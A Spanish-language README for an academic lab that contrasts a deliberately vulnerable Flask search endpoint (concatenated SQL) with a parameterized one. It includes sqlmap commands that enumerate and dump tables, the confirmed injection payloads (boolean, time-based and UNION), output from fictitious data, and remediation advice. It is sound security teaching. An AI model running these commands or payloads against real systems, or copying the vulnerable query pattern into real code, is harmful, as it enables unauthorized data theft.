# Demo de inyección SQL con sqlmap (laboratorio de caja blanca)

> **Práctica académica en entorno controlado.** Objetivo: una API propia
> corriendo en `127.0.0.1` con una vulnerabilidad puesta **a propósito**.
> Todos los datos y credenciales son **ficticios**. No ejecutar sqlmap contra
> sistemas que no sean propios o sin autorización por escrito.

Demuestra, sobre tu propia app, la diferencia entre una consulta **vulnerable**
(concatenación de cadenas) y una **segura** (consulta parametrizada), usando
`sqlmap` instalado en `C:\Users\jeuan\sqlmap-dev`.

## Archivos

| Archivo | Qué es |
|---|---|
| [`app_vulnerable.py`](app_vulnerable.py) | API Flask (puerto 5002) con dos buscadores: `/usuarios/buscar` (inseguro) y `/usuarios/buscar_seguro` (seguro) |
| [`sembrar_datos.py`](sembrar_datos.py) | inserta 4 usuarios ficticios en `lab_usuarios` |
| `sqlmap_1_deteccion.txt` | salida: detección de la inyección + banner + usuario + bases |
| `sqlmap_2_tablas.txt` | salida: enumeración de tablas |
| `sqlmap_3_dump.txt` | salida: volcado de la tabla `usuarios` |
| `sqlmap_4_seguro.txt` | salida: el endpoint seguro **no** es inyectable |

## La vulnerabilidad (CWE-89)

```python
# INSEGURO: el valor del usuario se concatena dentro del SQL
nombre = request.args.get("nombre", "")
sql = f"SELECT id, nombre, email FROM usuarios WHERE nombre LIKE '%{nombre}%'"
cur.execute(sql)
```
Frente a la versión correcta, que separa el dato del código:
```python
# SEGURO: consulta parametrizada; el dato nunca se interpreta como SQL
sql = "SELECT id, nombre, email FROM usuarios WHERE nombre LIKE %s"
cur.execute(sql, (f"%{nombre}%",))
```

## Cómo reproducirlo

```
# 1. MySQL de XAMPP encendido (puerto 3350) y datos de ejemplo
python sembrar_datos.py

# 2. Levantar la API vulnerable
python app_vulnerable.py            # http://127.0.0.1:5002

# 3. En otra terminal, sqlmap contra el endpoint inseguro
set URL=http://127.0.0.1:5002/usuarios/buscar?nombre=An
python C:\Users\jeuan\sqlmap-dev\sqlmap.py -u "%URL%" --batch --dbms=mysql --level=3 --risk=2 --banner --current-user --current-db --dbs
python C:\Users\jeuan\sqlmap-dev\sqlmap.py -u "%URL%" --batch --dbms=mysql -D lab_usuarios --tables
python C:\Users\jeuan\sqlmap-dev\sqlmap.py -u "%URL%" --batch --dbms=mysql --technique=U -D lab_usuarios -T usuarios -C "id,nombre,email,creado_en" --dump

# 4. Contraste: el mismo ataque contra el endpoint seguro no encuentra nada
python C:\Users\jeuan\sqlmap-dev\sqlmap.py -u "http://127.0.0.1:5002/usuarios/buscar_seguro?nombre=An" --batch --dbms=mysql --level=3 --risk=2 --technique=BEU
```

## Resultado de la ejecución real (23/11/2026)

**Endpoint inseguro `/usuarios/buscar` — vulnerable.** sqlmap confirmó tres
técnicas de inyección en el parámetro `nombre`:

```
Parameter: nombre (GET)
    Type: boolean-based blind
    Payload: nombre=An%' AND 1344=1344 AND 'Gzqi%'='Gzqi
    Type: time-based blind
    Payload: nombre=An%' AND (SELECT 1528 FROM (SELECT(!SLEEP(5)))yOwv) AND 'Kayv%'='Kayv
    Type: UNION query
    Payload: nombre=An%' UNION ALL SELECT NULL,CONCAT(...),NULL-- -

back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)  |  banner: 10.4.32-MariaDB
current user: 'lab_app@localhost'
current database: 'lab_usuarios'
available databases [3]: information_schema, lab_usuarios, test
```

Volcado completo de la tabla `usuarios` (datos ficticios):
```
+----+----------------+-------------------+---------------------+
| id | nombre         | email             | creado_en           |
+----+----------------+-------------------+---------------------+
| 1  | Ana Prueba     | ana@example.com   | 2026-11-23 00:50:01 |
| 3  | Beto Lab       | beto@example.com  | 2026-11-23 01:11:11 |
| 4  | Carla Test     | carla@example.com | 2026-11-23 01:11:11 |
| 5  | Admin Ficticio | admin@example.com | 2026-11-23 01:11:11 |
+----+----------------+-------------------+---------------------+
```
La columna `password_hash` también era accesible por la misma vía; se excluyó
del volcado solo para que sqlmap no entrara a su fase de crackeo por diccionario.

**Endpoint seguro `/usuarios/buscar_seguro` — no explotable.** El mismo ataque
reporta que el parámetro no es inyectable: la consulta parametrizada manda el
valor como dato, nunca como SQL.

## Análisis de caja blanca

1. **Causa raíz (visible en el código).** `app_vulnerable.py` arma el SQL con
   un f-string: el texto que manda el usuario se vuelve parte de la consulta.
   Con `nombre = An%' UNION ALL SELECT ... -- -`, la base ejecuta un `SELECT`
   extra elegido por el atacante.
2. **Impacto.** Con una sola entrada de la API, sqlmap identificó el motor
   (MariaDB 10.4.32), el usuario (`lab_app`), las bases y volcó la tabla
   completa. Con más alcance puede leer `information_schema`, otras bases y, si
   el usuario tuviera privilegios, escribir archivos o ejecutar comandos.
3. **Por qué el endpoint seguro resiste.** `execute(sql, (valor,))` envía la
   consulta y los datos por separado (*prepared statement*); el motor nunca
   interpreta el valor como código, así que no hay forma de "salir" de la cadena.
4. **Remediación.** Consultas parametrizadas **siempre** (nunca concatenar ni
   usar f-strings con entrada del usuario); validar y limitar la entrada; dar al
   usuario de BD el mínimo privilegio; y añadir un WAF y revisión de código /
   SAST para detectar estos patrones antes de desplegar.
